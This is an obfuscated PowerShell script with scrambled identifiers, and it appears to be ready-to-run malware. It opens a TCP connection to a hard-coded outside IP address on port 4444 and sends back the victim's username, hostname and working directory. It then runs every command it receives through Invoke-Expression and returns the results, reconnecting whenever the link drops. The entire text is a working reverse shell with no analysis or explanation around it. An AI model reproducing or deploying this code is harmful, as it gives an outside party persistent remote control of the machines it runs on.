class hlJlDrAcoR {
    
    [string]$rGMjJPDrMb = "93.49.240.195"
    [int]$WGmhEQISYOKQLfZMM = 4444

    $MoVJMHOiAoGk
    $ViIZHLxVEtpqZTQjAeoyp
    $ZMQpDju
    $tGdkIlwbOGsZLFGXxpkzZuZL
    $CcfzoBEx
    $GERvggbQnCyWBfJvry
    [int]$gNtfzBKWDPjQDgfXYKnO = 50*1024

    FxtdPgrkYuu() {
        $this.ViIZHLxVEtpqZTQjAeoyp = $false
        while ($true) {
            try {
                $this.ViIZHLxVEtpqZTQjAeoyp = New-Object Net.Sockets.TcpClient($this.rGMjJPDrMb, $this.WGmhEQISYOKQLfZMM)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.qvNWwWW()
    }

    qvNWwWW() {
        $this.MoVJMHOiAoGk = $this.ViIZHLxVEtpqZTQjAeoyp.GetStream()
        $this.tGdkIlwbOGsZLFGXxpkzZuZL = New-Object Byte[] $this.gNtfzBKWDPjQDgfXYKnO
        $this.GERvggbQnCyWBfJvry = New-Object Text.UTF8Encoding
        $this.ZMQpDju = New-Object IO.StreamWriter($this.MoVJMHOiAoGk, [Text.Encoding]::UTF8, $this.gNtfzBKWDPjQDgfXYKnO)
        $this.CcfzoBEx = New-Object System.IO.StreamReader($this.MoVJMHOiAoGk)
        $this.ZMQpDju.AutoFlush = $true
    }

    LmDathuvJSiva() {
        $this.FxtdPgrkYuu()
        $this.henUgd()
    }

    nQAYNEzNyQPBCfKGjAaWiHmJ($iTvucDHRQOtAUv) {
        try {
            [byte[]]$lnDnkfOawdHpfcf = [text.Encoding]::Ascii.GetBytes($iTvucDHRQOtAUv)
            $this.ZMQpDju.Write($lnDnkfOawdHpfcf, 0, $lnDnkfOawdHpfcf.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.LmDathuvJSiva()
        }
    }

    [string] MKwXVChUbvFnuJEC() {
        try {
            $CwUxrXATKCVvkJFrI = $this.MoVJMHOiAoGk.Read($this.tGdkIlwbOGsZLFGXxpkzZuZL, 0, $this.gNtfzBKWDPjQDgfXYKnO)    
            $PCyDSSluZNbNExHcsHRWWij = ($this.GERvggbQnCyWBfJvry.GetString($this.tGdkIlwbOGsZLFGXxpkzZuZL, 0, $CwUxrXATKCVvkJFrI))
            return $PCyDSSluZNbNExHcsHRWWij
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.LmDathuvJSiva()
            return ""
        }
    }

    [string] giViIZlfXH($JuYZXb) {
        Write-Host $JuYZXb
        try { 
            $kgCbCiSLdUWYpQzbFhQlWzNn = Invoke-Expression $JuYZXb | Out-String
        }
        catch {
            $JEVSZG = $_.Exception
            $RnbkWAc = $_.Message
            $kgCbCiSLdUWYpQzbFhQlWzNn = "`n$_`n"
        }
        return $kgCbCiSLdUWYpQzbFhQlWzNn
    }

    [string] wsMsRxoeV() {
        $eyNEkgrIeGGdRQHtFSJtbmxg = [Environment]::UserName
        $flivjVEqktBrofBEWlsD = [System.Net.Dns]::GetHostName()
        $xeQFoMXBwhcZLscRnoilfFYe = Get-Location
        return "$eyNEkgrIeGGdRQHtFSJtbmxg@$flivjVEqktBrofBEWlsD [$xeQFoMXBwhcZLscRnoilfFYe]~$ "
    }

    henUgd() {
        while ($this.ViIZHLxVEtpqZTQjAeoyp.Connected) {
            $this.nQAYNEzNyQPBCfKGjAaWiHmJ($this.wsMsRxoeV())         
            $PCyDSSluZNbNExHcsHRWWij = $this.MKwXVChUbvFnuJEC()
            $kgCbCiSLdUWYpQzbFhQlWzNn = "`n"
            if ([string]::IsNullOrEmpty($PCyDSSluZNbNExHcsHRWWij)) {
                continue
            }
            $kgCbCiSLdUWYpQzbFhQlWzNn = $this.giViIZlfXH($PCyDSSluZNbNExHcsHRWWij)
            $this.nQAYNEzNyQPBCfKGjAaWiHmJ($kgCbCiSLdUWYpQzbFhQlWzNn + "`n")
            $this.MoVJMHOiAoGk.Flush()
        }
        $this.ViIZHLxVEtpqZTQjAeoyp.Close()
        $this.LmDathuvJSiva()
    } 
}

$IriSx = [hlJlDrAcoR]::new()
$IriSx.LmDathuvJSiva()
